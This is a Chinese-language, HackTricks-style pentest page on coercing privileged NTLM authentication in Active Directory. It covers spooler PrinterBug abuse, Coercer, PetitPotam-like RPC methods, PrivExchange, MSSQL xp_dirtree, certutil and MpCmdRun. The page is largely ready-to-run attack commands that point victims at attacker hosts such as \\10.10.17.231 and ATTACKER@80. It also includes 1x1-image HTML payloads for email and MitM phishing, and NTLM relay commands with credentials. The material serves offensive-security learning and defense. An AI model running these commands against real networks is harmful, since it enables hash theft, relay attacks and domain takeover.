# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个用 C# 编写、使用 MIDL compiler 实现的 **remote authentication triggers** **collection**，用于避免 3rd party dependencies。

## Spooler Service Abuse

如果 _**Print Spooler**_ 服务已**启用，**你可以使用一些已知的 AD credentials 向 Domain Controller 的 print server **request** 对新 print jobs 的**update**，然后只需让它将 notification 发送到某个 system。\
注意，当 printer 将 notification 发送到一个任意 system 时，它需要对该 **system** 进行**authenticate against**。因此，攻击者可以让 _**Print Spooler**_ 服务对任意 system 进行 authenticate，而该服务在此 authentication 中会**使用 computer account**。

在底层，经典的 **PrinterBug** 原语滥用 `RpcRemoteFindFirstPrinterChangeNotificationEx`，通过 `\\PIPE\\spoolss` 实现。攻击者先打开一个 printer/server handle，然后在 `pszLocalMachine` 中提供一个伪造的 client name，使目标 spooler 创建一个 notification channel **回连到攻击者控制的主机**。这就是为什么其效果是 **outbound authentication coercion**，而不是直接 code execution。\
如果你想在 spooler 本身中寻找 **RCE/LPE**，请查看 [PrintNightmare](printnightmare.md)。本页重点是 **coercion and relay**。

### Finding Windows Servers on the domain

使用 PowerShell，获取 Windows boxes 的列表。Servers 通常优先级更高，所以先关注这里：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 查找正在监听的 Spooler services

使用经过轻微修改的 @mysmartlogin's（Vincent Le Toux's）[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看 Spooler Service 是否正在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
你也可以在 Linux 上使用 `rpcdump.py` 并查找 **MS-RPRN** 协议：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
或者在 Linux 上使用 **NetExec/CrackMapExec** 快速测试主机：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
如果你想**枚举 coercion surfaces**，而不只是检查 spooler endpoint 是否存在，可以使用 **Coercer scan mode**：
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
这很有用，因为在 EPM 中看到端点只会告诉你打印 RPC 接口已注册。它**并不**保证每一种 coercion 方法在你当前权限下都可达，或者该主机会发出一个可用的认证流。

### 请求该服务对任意主机进行认证

你可以从[这里](https://github.com/NotMedic/NetNTLMtoSilverTicket)编译 [SpoolSample]。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者，如果你在 Linux 上，可以使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
借助 **Coercer**，你可以直接针对 spooler 接口，而无需猜测暴露的是哪个 RPC 方法：
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### 使用 WebClient 强制使用 HTTP 而不是 SMB

经典的 PrinterBug 通常会向 `\\attacker\share` 触发一次 **SMB** 身份验证，这对于 **capture**、**relay to HTTP targets** 或 **relay where SMB signing is absent** 仍然很有用。\
不过，在现代环境中，将 **SMB to SMB** 进行 relay 往往会被 **SMB signing** 阻止，因此操作者通常更倾向于强制使用 **HTTP/WebDAV** 身份验证。

如果目标正在运行 **WebClient** 服务，监听器可以用一种让 Windows 使用 **WebDAV over HTTP** 的形式来指定：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
当与 **`ntlmrelayx --adcs`** 或其他 HTTP relay 目标链式利用时，这一点尤其有用，因为它避免了依赖被强制发起连接上的 SMB relayability。需要注意的关键点是：**WebClient 必须在受害者上运行**，HTTP/WebDAV 变体才能工作。

### Combining with Unconstrained Delegation

如果攻击者已经攻陷了一台具有 [Unconstrained Delegation](unconstrained-delegation.md) 的计算机，攻击者就可以**让打印机对这台计算机进行身份验证**。由于 Unconstrained Delegation，**打印机的计算机账户**的 **TGT** 会被**保存在**该具有 unconstrained delegation 的计算机的**内存**中。由于攻击者已经攻陷了这台主机，他就能够**取回这个票据**并加以滥用（[Pass the Ticket](pass-the-ticket.md)）。

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同一 spooler pipe 上的异步打印接口；使用 Coercer 枚举给定主机上可达的方法
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: 这些方法接受可以携带 UNC path 的参数（例如 `\\attacker\share`）。在处理时，Windows 会对该 UNC 进行身份验证（machine/user context），从而允许捕获或 relay NetNTLM。\
对于 spooler abuse，**MS-RPRN opnum 65** 仍然是最常见且文档最完善的原语，因为协议规范明确说明，服务器会根据 `pszLocalMachine` 指定的客户端创建一个通知通道返回给客户端。

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: 目标会尝试打开所提供的备份日志路径，并向攻击者控制的 UNC 进行身份验证。
- Practical use: 强制 Tier 0 资产（DC/RODC/Citrix/etc.）发出 NetNTLM，然后 relay 到 AD CS endpoints（ESC8/ESC11 场景）或其他高权限服务。

## PrivExchange

`PrivExchange` attack 是由 **Exchange Server `PushSubscription` feature** 中发现的一个缺陷导致的。这个 feature 允许任何拥有 mailbox 的 domain user 迫使 Exchange server 通过 HTTP 对任意由客户端提供的 host 进行身份验证。

默认情况下，**Exchange service 以 SYSTEM 运行**，并被赋予了过多权限（具体来说，在域 pre-2019 Cumulative Update 中，它拥有 **WriteDacl privileges**）。这个缺陷可以被利用来实现将信息 relay 到 LDAP，随后提取域 NTDS database。在无法 relay 到 LDAP 的情况下，这个缺陷仍可用于 relay 并对域内其他主机进行身份验证。成功利用该攻击后，任何已认证的 domain user account 都能立即获得 Domain Admin 访问权限。

## Inside Windows

如果你已经进入 Windows machine，可以通过以下方式强制 Windows 使用特权账户连接到 server：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
或者使用另一种技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft 签名的二进制文件）来强制 NTLM 身份验证：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 注入

### 通过 email

如果你知道要入侵的机器上登录用户的 **email address**，你可以直接给他发送一封 **带有 1x1 image 的 email**，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
当他打开它时，他会尝试进行身份验证。

### MitM

如果你可以对一台电脑执行 MitM attack，并在他将看到的页面中注入 HTML，你可以尝试在页面中注入如下这样的图片：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 其他强制和钓鱼 NTLM authentication 的方式


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

如果你能捕获 [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack)。\
_请记住，要 crack NTLMv1，你需要将 Responder challenge 设置为 "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
